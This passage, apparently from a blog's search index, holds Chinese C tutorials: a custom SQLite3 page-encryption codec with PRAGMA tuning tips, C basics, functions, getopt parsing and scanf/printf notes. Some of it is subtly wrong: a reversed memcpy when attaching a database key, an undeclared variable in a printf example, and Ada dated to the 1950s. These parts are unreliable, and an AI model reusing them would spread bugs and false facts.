My_DeEncrypt_Func(data, dwPageSize, pBlock-&gt;ReadKey, DB_KEY_LENGTH_BYTE ); /*调用我的解密函数*/ break;case 6: //加密一个主数据库文件的页 if (!pBlock-&gt;WriteKey) break; memcpy(pBlock-&gt;Data + CRYPT_OFFSET, data, pBlock-&gt;PageSize); data = pBlock-&gt;Data + CRYPT_OFFSET; dwPageSize = pBlock-&gt;PageSize; My_Encrypt_Func(data , dwPageSize, pBlock-&gt;WriteKey, DB_KEY_LENGTH_BYTE ); /*调用我的加密函数*/ break;case 7: //加密事务文件的页 /*在正常环境下, 读密钥和写密钥相同. 当数据库是被重新加密的,读密钥和写密钥未必相同. 回滚事务必要用数据库文件的原始密钥写入.因此,当一次回滚被写入,总是用数据库的读密钥, 这是为了保证与读取原始数据的密钥相同. */ if (!pBlock-&gt;ReadKey) break; memcpy(pBlock-&gt;Data + CRYPT_OFFSET, data, pBlock-&gt;PageSize); data = pBlock-&gt;Data + CRYPT_OFFSET; dwPageSize = pBlock-&gt;PageSize; My_Encrypt_Func( data, dwPageSize, pBlock-&gt;ReadKey, DB_KEY_LENGTH_BYTE ); /*调用我的加密函数*/ break;}return data;}//销毁一个加密块及相关的缓冲区,密钥.static void DestroyCryptBlock(LPCryptBlock pBlock){//销毁读密钥.if (pBlock-&gt;ReadKey){ sqliteFree(pBlock-&gt;ReadKey);}//如果写密钥存在并且不等于读密钥,也销毁.if (pBlock-&gt;WriteKey &amp;&amp; pBlock-&gt;WriteKey != pBlock-&gt;ReadKey){ sqliteFree(pBlock-&gt;WriteKey);}if(pBlock-&gt;Data){ sqliteFree(pBlock-&gt;Data);}//释放加密块.sqliteFree(pBlock);}static void * sqlite3pager_get_codecarg(Pager *pPager){return (pPager-&gt;xCodec) ? pPager-&gt;pCodecArg: NULL;}// 从用户提供的缓冲区中得到一个加密密钥static unsigned char * DeriveKey(const void *pKey, int nKeyLen){unsigned char * hKey = NULL;int j;if( pKey == NULL || nKeyLen == 0 ){ return NULL;}hKey = sqliteMalloc( DB_KEY_LENGTH_BYTE + 1 );if( hKey == NULL ){ return NULL;}hKey[ DB_KEY_LENGTH_BYTE ] = 0;if( nKeyLen &lt; DB_KEY_LENGTH_BYTE ){ memcpy( hKey, pKey, nKeyLen ); //先拷贝得到密钥前面的部分 j = DB_KEY_LENGTH_BYTE - nKeyLen; //补充密钥后面的部分 memset( hKey + nKeyLen, DB_KEY_PADDING, j );}else{ //密钥位数已经足够,直接把密钥取过来 memcpy( hKey, pKey, DB_KEY_LENGTH_BYTE );}return hKey;}//创建或更新一个页的加密算法索引.此函数会申请缓冲区.static LPCryptBlock CreateCryptBlock(unsigned char* hKey, Pager *pager, LPCryptBlock pExisting){LPCryptBlock pBlock;if (!pExisting) //创建新加密块{ pBlock = sqliteMalloc(sizeof(CryptBlock)); memset(pBlock, 0, sizeof(CryptBlock)); pBlock-&gt;ReadKey = hKey; pBlock-&gt;WriteKey = hKey; pBlock-&gt;PageSize = pager-&gt;pageSize; pBlock-&gt;Data = (unsigned char*)sqliteMalloc(pBlock-&gt;PageSize + CRYPT_OFFSET);}else //更新存在的加密块{ pBlock = pExisting; if ( pBlock-&gt;PageSize != pager-&gt;pageSize &amp;&amp; !pBlock-&gt;Data){ sqliteFree(pBlock-&gt;Data); pBlock-&gt;PageSize = pager-&gt;pageSize; pBlock-&gt;Data = (unsigned char*)sqliteMalloc(pBlock-&gt;PageSize + CRYPT_OFFSET); }}memset(pBlock-&gt;Data, 0, pBlock-&gt;PageSize + CRYPT_OFFSET);return pBlock;}/*** Set the codec for this pager*/void sqlite3pager_set_codec( Pager *pPager, void *(*xCodec)(void*,void*,Pgno,int), void *pCodecArg ){pPager-&gt;xCodec = xCodec;pPager-&gt;pCodecArg = pCodecArg;}int sqlite3_key(sqlite3 *db, const void *pKey, int nKey){return sqlite3_key_interop(db, pKey, nKey);}int sqlite3_rekey(sqlite3 *db, const void *pKey, int nKey){return sqlite3_rekey_interop(db, pKey, nKey);}/*被sqlite 和 sqlite3_key_interop 调用, 附加密钥到数据库.*/int sqlite3CodecAttach(sqlite3 *db, int nDb, const void *pKey, int nKeyLen){ int rc = SQLITE_ERROR; unsigned char* hKey = 0; //如果没有指定密匙,可能标识用了主数据库的加密或没加密. if (!pKey || !nKeyLen) { if (!nDb) { return SQLITE_OK; //主数据库, 没有指定密钥所以没有加密. } else //附加数据库,使用主数据库的密钥. { //获取主数据库的加密块并复制密钥给附加数据库使用 LPCryptBlock pBlock = (LPCryptBlock)sqlite3pager_get_codecarg(sqlite3BtreePager(db-&gt;aDb[0].pBt)); if (!pBlock) return SQLITE_OK; //主数据库没有加密 if (!pBlock-&gt;ReadKey) return SQLITE_OK; //没有加密 memcpy(pBlock-&gt;ReadKey, &amp;hKey, 16); } } else //用户提供了密码,从中创建密钥. { hKey = DeriveKey(pKey, nKeyLen); } //创建一个新的加密块,并将解码器指向新的附加数据库. if (hKey) { LPCryptBlock pBlock = CreateCryptBlock(hKey, sqlite3BtreePager(db-&gt;aDb[nDb].pBt), NULL); sqlite3pager_set_codec(sqlite3BtreePager(db-&gt;aDb[nDb].pBt), sqlite3Codec, pBlock); rc = SQLITE_OK; } return rc;}// Changes the encryption key for an existing database.int __stdcall sqlite3_rekey_interop(sqlite3 *db, const void *pKey, int nKeySize){Btree *pbt = db-&gt;aDb[0].pBt;Pager *p = sqlite3BtreePager(pbt);LPCryptBlock pBlock = (LPCryptBlock)sqlite3pager_get_codecarg(p);unsigned char * hKey = DeriveKey(pKey, nKeySize);int rc = SQLITE_ERROR;if (!pBlock &amp;&amp; !hKey) return SQLITE_OK;//重新加密一个数据库,改变pager的写密钥, 读密钥依旧保留.if (!pBlock) //加密一个未加密的数据库{ pBlock = CreateCryptBlock(hKey, p, NULL); pBlock-&gt;ReadKey = 0; // 原始数据库未加密 sqlite3pager_set_codec(sqlite3BtreePager(pbt), sqlite3Codec, pBlock);}else // 改变已加密数据库的写密钥{ pBlock-&gt;WriteKey = hKey;}// 开始一个事务rc = sqlite3BtreeBeginTrans(pbt, 1);if (!rc){ // 用新密钥重写所有的页到数据库。 Pgno nPage = sqlite3PagerPagecount(p); Pgno nSkip = PAGER_MJ_PGNO(p); void *pPage; Pgno n; for(n = 1; rc == SQLITE_OK &amp;&amp; n &lt;= nPage; n ++) { if (n == nSkip) continue; rc = sqlite3PagerGet(p, n, &amp;pPage); if(!rc) { rc = sqlite3PagerWrite(pPage); sqlite3PagerUnref(pPage); } }}// 如果成功，提交事务。if (!rc){ rc = sqlite3BtreeCommit(pbt);}// 如果失败，回滚。if (rc){ sqlite3BtreeRollback(pbt);}// 如果成功，销毁先前的读密钥。并使读密钥等于当前的写密钥。if (!rc){ if (pBlock-&gt;ReadKey) { sqliteFree(pBlock-&gt;ReadKey); } pBlock-&gt;ReadKey = pBlock-&gt;WriteKey;}else// 如果失败，销毁当前的写密钥，并恢复为当前的读密钥。{ if (pBlock-&gt;WriteKey) { sqliteFree(pBlock-&gt;WriteKey); } pBlock-&gt;WriteKey = pBlock-&gt;ReadKey;}// 如果读密钥和写密钥皆为空，就不需要再对页进行编解码。// 销毁加密块并移除页的编解码器if (!pBlock-&gt;ReadKey &amp;&amp; !pBlock-&gt;WriteKey){ sqlite3pager_set_codec(p, NULL, NULL); DestroyCryptBlock(pBlock);}return rc;}/***下面是加密函数的主体***/int __stdcall sqlite3_key_interop(sqlite3 *db, const void *pKey, int nKeySize){ return sqlite3CodecAttach(db, 0, pKey, nKeySize);}// 释放与一个页相关的加密块void sqlite3pager_free_codecarg(void *pArg){if (pArg) DestroyCryptBlock((LPCryptBlock)pArg);}#endif //#ifdef SQLITE_HAS_CODEC 五、性能优化很多人直接就使用了，并未注意到SQLite也有配置参数，可以对性能进行调整。有时候，产生的结果会有很大影响。 主要通过pragma指令来实现。 比如： 空间释放、磁盘同步、Cache大小等。 不要打开。前文提高了，Vacuum的效率非常低！ 1 auto_vacuum 12PRAGMA auto_vacuum; PRAGMA auto_vacuum = 0 | 1; 查询或设置数据库的auto-vacuum标记。 正常情况下，当提交一个从数据库中删除数据的事务时，数据库文件不改变大小。未使用的文件页被标记并在以后的添加操作中再次使用。这种情况下使用VACUUM命令释放删除得到的空间。 当开启auto-vacuum，当提交一个从数据库中删除数据的事务时，数据库文件自动收缩， (VACUUM命令在auto-vacuum开启的数据库中不起作用)。数据库会在内部存储一些信息以便支持这一功能，这使得数据库文件比不开启该选项时稍微大一些。 只有在数据库中未建任何表时才能改变auto-vacuum标记。试图在已有表的情况下修改不会导致报错。 2 cache_size 建议改为8000 12PRAGMA cache_size; PRAGMA cache_size = Number-of-pages; 查询或修改SQLite一次存储在内存中的数据库文件页数。每页使用约1.5K内存，缺省的缓存大小是2000. 若需要使用改变大量多行的UPDATE或DELETE命令，并且不介意SQLite使用更多的内存的话，可以增大缓存以提高性能。 当使用cache_size pragma改变缓存大小时，改变仅对当前对话有效，当数据库关闭重新打开时缓存大小恢复到缺省大小。 要想永久改变缓存大小，使用default_cache_size pragma. 3 case_sensitive_like 打开。不然搜索中文字串会出错。 12PRAGMA case_sensitive_like; PRAGMA case_sensitive_like = 0 | 1; LIKE运算符的缺省行为是忽略latin1字符的大小写。因此在缺省情况下’a’ LIKE ‘A’的值为真。可以通过打开case_sensitive_like pragma来改变这一缺省行为。当启用case_sensitive_like，’a’ LIKE ‘A’为假而 ‘a’ LIKE ‘a’依然为真。 4 count_changes 打开。便于调试 12PRAGMA count_changes; PRAGMA count_changes = 0 | 1; 查询或更改count-changes标记。正常情况下INSERT, UPDATE和DELETE语句不返回数据。 当开启count-changes，以上语句返回一行含一个整数值的数据——该语句插入，修改或删除的行数。 返回的行数不包括由触发器产生的插入，修改或删除等改变的行数。 5 page_size 12PRAGMA page_size; PRAGMA page_size = bytes; 查询或设置page-size值。只有在未创建数据库时才能设置page-size。页面大小必须是2的整数倍且大于等于512小于等于8192。 上限可以通过在编译时修改宏定义SQLITE_MAX_PAGE_SIZE的值来改变。上限的上限是32768. 6 synchronous 如果有定期备份的机制，而且少量数据丢失可接受，用OFF 1234PRAGMA synchronous; PRAGMA synchronous = FULL; (2) PRAGMA synchronous = NORMAL; (1) PRAGMA synchronous = OFF; (0) 查询或更改”synchronous”标记的设定。第一种形式(查询)返回整数值。 当synchronous设置为FULL (2), SQLite数据库引擎在紧急时刻会暂停以确定数据已经写入磁盘。 这使系统崩溃或电源出问题时能确保数据库在重起后不会损坏。FULL synchronous很安全但很慢。 当synchronous设置为NORMAL, SQLite数据库引擎在大部分紧急时刻会暂停，但不像FULL模式下那么频繁。 NORMAL模式下有很小的几率(但不是不存在)发生电源故障导致数据库损坏的情况。但实际上，在这种情况下很可能你的硬盘已经不能使用，或者发生了其他的不可恢复的硬件错误。 设置为synchronous OFF (0)时，SQLite在传递数据给系统以后直接继续而不暂停。若运行SQLite的应用程序崩溃， 数据不会损伤，但在系统崩溃或写入数据时意外断电的情况下数据库可能会损坏。另一方面，在synchronous OFF时 一些操作可能会快50倍甚至更多。 在SQLite 2中，缺省值为NORMAL.而在3中修改为FULL. 7 temp_store 使用2，内存模式。 1234PRAGMA temp_store; PRAGMA temp_store = DEFAULT; (0) PRAGMA temp_store = FILE; (1) PRAGMA temp_store = MEMORY; (2) 查询或更改”temp_store”参数的设置。当temp_store设置为DEFAULT (0),使用编译时的C预处理宏 TEMP_STORE来定义储存临时表和临时索引的位置。当设置为MEMORY (2)临时表和索引存放于内存中。 当设置为FILE (1)则存放于文件中。temp_store_directorypragma 可用于指定存放该文件的目录。当改变temp_store设置，所有已存在的临时表，索引，触发器及视图将被立即删除。 经测试，在类BBS应用上，通过以上调整，效率可以提高2倍以上。 六、后记（原文后记） 写此教程，可不是一个累字能解释。 但是我还是觉得欣慰的，因为我很久以前就想写 sqlite 的教程，一来自己备忘，二而已造福大众，大家不用再走弯路。 本人第一次写教程，不足的地方请大家指出。 本文可随意转载、修改、引用。但无论是转载、修改、引用，都请附带我的名字：董淳光。以示对我劳动的肯定。","link":"/2022/11/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80SQLite3%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"},{"title":"C语言之一：基础知识","text":"大家好啊，今天我就和大家聊一聊C语言程序的编写。 首先的首先，请一定记得将你的输入法调至英文模式，确保你输入的符号是半角符号。不然，你就掉进了初学者的第一个大坑：符号的大大大大大大大大大大大大大大大大坑！ 那么我们正式开始。首先，我们来看一个例子。 123456789101112//Example-1-1-Hello,World!#include &lt;stdio.h&gt;int main(void){ int year=2020; /* 我的第一个 C 程序 */ printf(&quot;Hello, World %d！\\n&quot;,year); return 0;} 这就是一个C程序的源代码。如果想让它运行起来，我们得把它编译成为可执行程序。这个“编译”的过程，就像是翻译：你用的是C语言，电脑却只能听得懂二进制语言，要让电脑听得懂，你就必须把你写的源码“翻译”成电脑能认识的二进制代码。这个工作的完成，需要借助于“编译器”的功能。 你可能会想了：既然还要翻译一遍，为什么不直接用“二进制语言”来写程序呢？这个“翻译官”会不会把我写的代码翻译错啊？首先，你当然可以用二进制来直接编写程序。但是这有两个缺点：第一个，你的开发效率会非常低。第二个，你的源代码非常不便于修改和阅读。你想想，屏幕上只有一大片0和1，你肯定得看好长一阵子才能弄明白这是什么意思——哪怕它是你自己写的也一样。所以汇编语言就诞生了。但是它太过于抽象，而且可移植性也不是很强，所以还是得高级语言来干写程序的活——我们现在用的C语言就是高级语言。当然，这个“高级”不是说汇编语言不好，而是说相对于汇编语言直接操作底层，C语言是在软件层面操作的。其次，这个“翻译官”不会出错，因为它是按照你写的源码“字字对译”的。所以，如果出错，那一般是源码中出现错误（也就是bug）。 那么，我们现在就需要安装一个编译器。在Windows平台上，我们常用的编译器是Mingw。要使用它，我们需要用命令行操作——太麻烦了，所以我们一般用IDE（集成开发环境）这里我推荐大家用Dev-cpp（点击下载）。当然，有能力的同学也可以尝试用VS Code搭建C语言开发环境。 安装好之后，先在你的电脑里新建一个文件夹，专门用来放置源代码和程序。然后，打开Dev-cpp，新建一个文件，并保存在刚才的文件夹（下文称作“工作区”），然后在里面输入上面的源码。最后，点击运行，按照提示操作就可以。嗯，差不多就是这样了。 你会看到屏幕上出现了一个黑框，可能是一闪而过的。如果是这样的话，请在return 0;的前面加上一行： 1getchar（）; 现在再看看，黑框里是不是出现了Hello，World！呢？如果是，那么恭喜你，你写出了你的第一个C语言程序。 好，让我们回过头来，看看这段源代码里都是什么。 整个程序结构明显，由两大块构成。第一块是以#开头的那一行，第二块则是int main(void)和后面花括号所包住的一块。我们把第一块叫做“预处理指令”，第二块叫做“main函数”。绝大多数程序都由这两大块构成。 「预处理指令和预处理器」预处理器就是用来处理预处理指令的工具。C 预处理器（C Preprocessor）不是编译器的组成部分，但是它是编译过程中一个单独的步骤。换句话说，C 预处理器只不过是一个文本替换工具而已，它们会指示编译器在实际编译之前完成所需的预处在这个例子中，C预处理器将用名为stdio.h的文件内的所有内容替换这一行指令（很像复制粘贴吧）。 所有的预处理器命令都是以井号（#）开头。它必须是这一行指令的第一个非空字符，为了增强可读性，预处理器指令应从第一列（也就是这一行的开头）开始换句话说，预处理指令前最好不要留空格。目前我们接触到的预处理指令只有#include一个，它的作用就是内容替换。后面我们还会接触更多。 「main()函数」函数是一组一起执行一个任务的语句。函数是构成C程序的基本模块。每个C程序都至少有一个函数，即主函数 main() ，所有简单的程序都可以定义其他额外的函数。 main（）在c语言里，是一个程序的起点。一个程序一般会从main（）里的第一行语句开始执行，一直到最后一行的return（）函数结束程序。的确，main是一个极其普通的名称，但是这是唯一的选择。C程序一定从main()函数开始执行（目前不必考虑例外情况）。除了main()函数，你可以任意命名其他函数，而且main()函数必须是开始的函数。那一对圆括号是用于识别main()是一个函数。main前的int则是main()函数的返回类型。int表明main()函数返回的值是整数。返回到哪里？操作系统。后面我们会细说这个问题。 「注释」在程序中，被/**/两个符号括起来的部分是程序的注释。写注释能让他人（包括自己）更容易明白你写的程序。由//符号开头的一行也是注释。下面是一些有效注释的例子： 12345678910/*我是注释。*///巧了我也是。/*我也是注释，不过被分成两行。*//*我还是注释。*/ 「花括号、函数体和块」在main()函数后面跟着一对花括号，里面框着main()函数的所有语句，这些语句合称函数体。一般而言，所有的C函数都使用花括号标记函数体的开始和结束。这是规定，不能省略。只有花括号能起这种作用，圆括号（()）和方括号（[]）都不行。 花括号还可以用来把函数的多条语句合并为一个单元或块。如果你熟悉 Pascal, ADA, Modula-2或者 Algol（不过估计大家都没听过，毕竟是很老的东西……记得没错的话，ADA都是上世纪50年代的东西了），就会明白花括号在C语言中的作用相类似于这些语言中的begin和end。 「声明」程序中有这么一行： 1int year=2020; 这是一句声明语句，声明了一个int（整数）类型的，叫做year的变量。int是C语言的一个关键字，也就是说，你在给你的函数，变量之类的东西命名时，你必须避免使用这个名称。year则是一个标识符，也就是一个变量、函数或其他实体的名称。所以，声明，就是把一个标识符和计算机内存中的一个特定位置联系起来，同时也确定了储存在某位置的信息类型或数据类型。 C语言的一个很重要的特性就是，所有的变量必须先声明才能使用。并且，声明要放到块的顶部。另外，C语言的标识符在命名时，只能用小写字母、大写字母、数字和下划线（_）来命名。而且，名称的第一个字符不能是数字。另外，在C语言中，只有大小写不同的两个标识符是不同的，即“大小写敏感”。比如，STARS，Stars，stars就是三个不同的标识符。在声明标识符的时候，应该有明确的含义，就像例子中的year，能让人一眼看出这个变量是存储年份的。另外，关于标识符的长度限制，一般的标识符长度是63个字节，而外部标识符的长度是31个字节（外部标识符后面会解释）。总之，在命名标识符时，要做到简洁明了。 「printf()函数和scanf()函数」printf()函数是格式化输出函数, 一般用于向输出设备按规定式样输出消息（比如显示遗传字符）。printf()函数的语法为: 1printf(&quot;格式化字符串&quot;，参数表); 其中格式化字符串包括两部分内容: 一部分是正常字符, 这些字符将按原样输出；另一部分是格式化规定字符, 以”%”开头, 后跟一个或几个规定字符, 用来确定输出内容式样（比如本例中的%d就是。其实说通俗一点，这些就是占位符，表示这里要输出一个数字，具体是多少要在后面的参量表里找）。参量表是需要输出的一系列参数, 其个数务必与格式化字符串所阐明的输出参数个数一样多（就是前的%开头的占位符数量必须和后面的参量数量一样多）, 各参数之间用”,”分开, 且顺序逐一对应,不然将会出现意想不到的过失。 常用的格式化规定字符还有：%s（字符串），%f（小数，也称作浮点数）,%c(单个的字母）等等。另外格式化字符串中还会出现制表符，比如\\n表示换行,\\t表示缩进等等，我们会在后面详细说。 scanf()函数大致类似，下面我举一个例子。 12345678910111213//Example-2-Print&amp;Scan#include &lt;stdio.h&gt;int main(void){ int age; //声明一个叫做age的整型变量 printf(&quot;Input your age:&quot;,year); scanf(&quot;%d&quot;,&amp;age); printf(&quot;You are %d years old!&quot;,age); return 0;} 可以看出，scanf()的用法和printf差不多，只不过在要赋值的变量名前要加上&amp;符号（解引用符号，具体在指针中会讲到）。 那么第一次教程就是这样了。如你所见，东西确实不少，因为我想用尽可能短的篇幅帮大家入门C语言编程，感受C的快乐，而又限于个人水平，最后就写成了这样。如果有不完善的地方欢迎指出，谢谢。","link":"/2020/12/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"title":"C语言之二：函数","text":"函数是一组一起执行一个任务的语句。每个 C 程序都至少有一个函数，即主函数 main() ，所有简单的程序都可以定义其他额外的函数。 你可以把代码划分到不同的函数中。如何划分代码到不同的函数中是由你来决定的，但在逻辑上，划分通常是根据每个函数执行一个特定的任务来进行的。 函数声明告诉编译器函数的名称、返回类型和参数。函数定义提供了函数的实际主体。 C 标准库提供了大量的程序可以调用的内置函数。例如，函数 strcat()用来连接两个字符串，函数 memcpy() 用来复制内存到另一个位置。 函数还有很多叫法，比如方法、子例程或程序，等等。 定义函数C 语言中的函数定义的一般形式如下： 1234return_type function_name( parameter list ){body of the function} 在 C 语言中，函数由一个函数头和一个函数主体组成。下面列出一个函数的所有组成部分： 返回类型（return_type）：一个函数可以返回一个值。return_type是函数返回的值的数据类型。有些函数执行所需的操作而不返回值，在这种情况下，return_type 是关键字 void。 函数名称（function_name）：这是函数的实际名称。函数名和参数列表一起构成了函数签名。 参数（parameter list）：参数就像是占位符。当函数被调用时，你向参数传递一个值，这个值被称为实际参数。参数列表包括函数参数的类型、顺序、数量。参数是可选的，也就是说，函数可能不包含参数。 函数主体（body of the function）：函数主体包含一组定义函数执行任务的语句。 实例以下是 max() 函数的源代码。该函数有两个参数 num1 和 num2，会返回这两个数中较大的那个数： 12345678910111213/* 函数返回两个数中较大的那个数 */ int max(int num1, int num2) { /* 局部变量声明 */ int result; if (num1 &gt; num2) result = num1; else result = num2; return result; } 函数声明函数声明会告诉编译器函数名称及如何调用函数。函数的实际主体可以单独定义。 函数声明包括以下几个部分： return_type function_name( parameter list ); 针对上面定义的函数 max()，以下是函数声明： 1int max(int num1, int num2); 在函数声明中，参数的名称并不重要，只有参数的类型是必需的，因此下面也是有效的声明： 1int max(int, int); 当你在一个源文件中定义函数且在另一个文件中调用函数时，函数声明是必需的。在这种情况下，你应该在调用函数的文件顶部声明函数。 调用函数创建 C 函数时，会定义函数做什么，然后通过调用函数来完成已定义的任务。 当程序调用函数时，程序控制权会转移给被调用的函数。被调用的函数执行已定义的任务，当函数的返回语句被执行时，或到达函数的结束括号时，会把程序控制权交还给主程序。 调用函数时，传递所需参数，如果函数返回一个值，则可以存储返回值。例如： 123456789101112131415161718192021222324252627282930//Example-2-1-返回最大值#include &lt;stdio.h&gt;/* 函数声明 */int max(int num1, int num2);int main (void){int a = 100,b = 200,ret; //局部变量定义/* 调用函数来获取最大值 */ret = max(a, b);printf( &quot;Max value is : %d\\n&quot;, ret );return 0;}/* 函数返回两个数中较大的那个数 */int max(int num1, int num2){/* 局部变量声明 */int result;if (num1 &gt; num2)result = num1;elseresult = num2;return result;} 把 max() 函数和 main() 函数放一块，编译源代码。当运行最后的可执行文件时，会产生下列结果： 1Max value is : 200 函数参数如果函数要使用参数，则必须声明接受参数值的变量。这些变量称为函数的形式参数。 形式参数就像函数内的其他局部变量，在进入函数时被创建，退出函数时被销毁。 当调用函数时，有两种向函数传递参数的方式： 调用类型描述传值。调用该方法把参数的实际值复制给函数的形式参数（形式参数可以理解为占位符，就是表示这里有这么一个类型的参数）。在这种情况下，修改函数内的形式参数不会影响实际参数。也就是说，刚才的max(a,b)是通过将a和b的值分别复制到了max()函数的num1和num2两个变量中完成了将数值传递到max()中的任务。 引用调用。通过指针传递方式，形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作。默认情况下，C 使用传值调用来传递参数。一般来说，这意味着函数内的代码不能改变用于调用函数的实际参数。（这个地方看不懂也无所谓，后面会明朗的。总之只要记住第一种方式就好）","link":"/2020/12/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80%E4%B9%8B%E4%BA%8C%EF%BC%9A%E5%87%BD%E6%95%B0/"},{"title":"C语言命令行参数解析","text":"在编写需要命令行参数的C程序的时候，往往我们需要先解析命令行参数，然后根据这些参数来启动我们的程序。 C的库函数中提供了两个函数可以用来帮助我们解析命令行参数:getopt、getopt_long。 getopt可以解析短参数，所谓短参数就是指选项前只有一个“-”(如-t)，而getopt_long则支持短参数跟长参数(如”–prefix”)。 getopt函数1234#include&lt;unistd.h&gt;int getopt(int argc,char * const argv[],const char *optstring);extern char *optarg; //当前选项参数字串（如果有）extern int optind; //argv的当前索引值 各参数的意义: argc:通常为main函数中的argc argv:通常为main函数中的argv optstring:用来指定选项的内容(如:”ab:c”)，它由多个部分组成，表示的意义分别为： 单个字符，表示选项。 单个字符后接一个冒号：表示该选项后必须跟一个参数。参数紧跟在选项后或者以空格隔开。该参数的指针赋给optarg。 单个字符后跟两个冒号，表示该选项后可以跟一个参数，也可以不跟。如果跟一个参数，参数必须紧跟在选项后不能以空格隔开。该参数的指针赋给optarg。 调用该函数将返回解析到的当前选项，该选项的参数将赋给optarg，如果该选项没有参数，则optarg为NULL。下面将演示该函数的用法 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;int main(int argc,char *argv[]){ int opt=0; int a=0; int b=0; char s[50]; while((opt=getopt(argc,argv,&quot;ab:&quot;))!=-1) { switch(opt) { case 'a':a=1;break; case 'b':b=1;strcpy(s,optarg);break; } } if(a) printf(&quot;option a\\n&quot;); if(b) printf(&quot;option b:%s\\n&quot;,s); return 0;} 编译之后可以如下调用该程序 getopt_long函数与getopt不同的是，getopt_long还支持长参数。 12#include &lt;getopt.h&gt;int getopt_long(int argc, char * const argv[],const char *optstring,const struct option *longopts, int *longindex); 前面三个参数跟getopt函数一样(解析到短参数时返回值跟getopt一样)，而长参数的解析则与longopts参数相关，该参数使用如下的结构 123456789101112131415struct option { //长参数名 const char *name; /* 表示参数的个数 no_argument(或者0)，表示该选项后面不跟参数值 required_argument(或者1)，表示该选项后面一定跟一个参数 optional_argument(或者2)，表示该选项后面的参数可选 */ int has_arg; //如果flag为NULL，则函数会返回下面val参数的值，否则返回0，并将val值赋予赋予flag所指向的内存 int *flag; //配合flag来决定返回值 int val;}; 参数longindex，表示当前长参数在longopts中的索引值，如果不需要可以置为NULL。 下面是使用该函数的一个例子 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;getopt.h&gt;int learn=0;static const struct option long_option[]={ {&quot;name&quot;,required_argument,NULL,'n'}, {&quot;learn&quot;,no_argument,&amp;learn,1}, {NULL,0,NULL,0}};int main(int argc,char *argv[]){ int opt=0; while((opt=getopt_long(argc,argv,&quot;n:l&quot;,long_option,NULL))!=-1) { switch(opt) { case 0:break; case 'n':printf(&quot;name:%s &quot;,optarg); } } if(learn) printf(&quot;learning\\n&quot;);} 编译之后可以如下调用该程序","link":"/2022/11/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90/"},{"title":"C语言学习笔记：scanf与printf","text":"概览这两个函数的原型都在stdio.h头文件中，分别如下： 1int scanf(const char * restrict format,...); 1234// C99 前int printf( const char *format, ... );// C99 起int printf( const char *restrict format, ... ); 它们的参数列表中，第一个是格式控制字符串，包含了两种类型的对象：普通字符和转换说明；第二个及以后的参数是与格式化字符串一一对应的参数列表。 它们返回int类型的数据，表示成功处理的参数数量，下面分别详细说明。 scanfscanf函数返回成功读入的数据项数，读入数据时遇到了“文件结束”则返回EOF。 读取一整行12345678#include&lt;stdio.h&gt; int main() { char str[1024]; scanf(&quot;%[^\\n]&quot;, &amp;str); ... return 0; } 格式指令说明format指向的字符串包含的格式指令由以下字符序列组成[4] ：*表示读入的数据将被舍弃。带有的格式指令不对应可变参数列表中的任何数据。域宽以一个非零的十进制整数形式出现。表示该格式指令最多读入的字符数。格式说明符c 读入域宽指定的数目个字符组成的字符序列（后面不会加上空字节），如果省略宽度则读入单字符。如%c或%1c读入单字符，%2c读入两个字符（后面不会加上空字节），以此类推。s读入一个的字符序列，后面会加上空字节，遇到空白字符(\\t \\r \\n 空格等)完成读取。d 读入可选有符号（可选有符号表示输入时可以带符号也可以不带符号，不带符号则视为非负）十进制整数。输入格式应该像strtol函数的base实参为10调用时识别的字符序列一样。u 读入无符号符号十进制整数。输入格式应该像strtol函数的base实参为10调用时识别的字符序列一样。i 读入可选有符号整数。输入格式应该像strtol函数的base实参为0调用时识别的字符序列一样。a,e,f,g,A,E,F,G 读入可选有符号浮点数，输入格式应该像strtod函数识别的字符序列一样。o 读入可选有符号八进制整数。输入格式应该像strtoul函数的base实参为8调用时识别的字符序列一样。x,X读入可选有符号十六进制整数。输入格式应该像strtoul函数的base实参为16调用时识别的字符序列一样。p 读入一个指针值。读入的字符序列应该与fprintf的%p产生的字符序列形式相同。n 不读入任何字符，而是把到该位置已读入的字符数存储到与之对应的int指向的位置。本转换说明符如果带有*或者带有域宽信息（如：%*n或%3n等），则后果是未定义的。扫描字符集合% 读入% 符号(百分号)无效的转换说明符将引起未定义的行为。[5]长度修饰符hh与d, i, o, u, x, X, or n配合使用，表示对应一个signed char或unsigned char数据。h与d, i, o, u, x, X, or n配合使用，表示对应一个short int或unsigned short int数据。l 与d, i, o, u, x, X, or n配合使用，表示对应一个long int或unsigned long int数据；与a, A, e, E, f, F, g, or G配合使用表示对应一个double数据；与c,s,[配合使用表示对应wchar_t数据。ll与d, i, o, u, x, X, or n配合使用，表示对应一个long long int或unsigned long long int数据。j与d, i, o, u, x, X, or n配合使用，表示对应一个intmax_t或uintmax_t数据。z与d, i, o, u, x, X, or n配合使用，表示对应一个size_t数据（或与size_t对应的有符号整型数据）。t与d, i, o, u, x, X, or n配合使用，表示对应一个ptrdiff_t数据（或与ptrdiff_t对应的无符号整型数据）。L 与a, A, e, E, f, F, g, or G配合使用，表示对应一个long double数据。如果长度修饰符与格式说明符不匹配则引起未定义的行为。 （1）%s 表示读字符串，而 %d 表示读整数。格式串的处理顺序为从左到右，格式说明符逐一与变元表中的变元匹配。为了读取长整数，可以将 L / l 